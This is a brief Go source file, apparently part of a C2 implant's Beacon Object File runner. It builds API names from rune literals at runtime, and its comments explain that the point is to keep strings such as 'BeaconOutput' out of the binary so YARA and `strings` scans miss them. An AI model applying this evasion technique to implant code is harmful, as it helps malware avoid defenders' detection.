//go:build windows

package bof

// runesToString builds a string from rune literals at runtime so the
// resulting bytes never appear as a contiguous ASCII literal in the
// compiled binary's .rdata section. Confirmed empirically:
//
//   package main
//   func main() { println(string([]rune{'B','e','a','c','o','n','O','u','t','p','u','t'})) }
//
// `strings ./binary | grep -c BeaconOutput` returns 0, vs 1 for the
// literal form. goffloader exploits the same property; the technique
// defeats naive YARA rules keying on "BeaconPrintf" / "BeaconOutput" /
// etc. in the BOF runner's static strings.
//
// Each Beacon import-table key registered via this helper is therefore
// invisible to a `strings` scan of the implant binary. Operators who
// want stronger obfuscation should pair this with garble at build
// time (slice 1.c.11 in the BOF revamp plan).
func runesToString(r ...rune) string { return string(r) }

// impName returns the "__imp_<name>" form with neither the prefix
// nor the name appearing as a literal in .rdata. The prefix runes are
// inlined so this helper has no string-literal overhead.
func impName(nameRunes ...rune) string {
	return runesToString('_', '_', 'i', 'm', 'p', '_') + runesToString(nameRunes...)
}
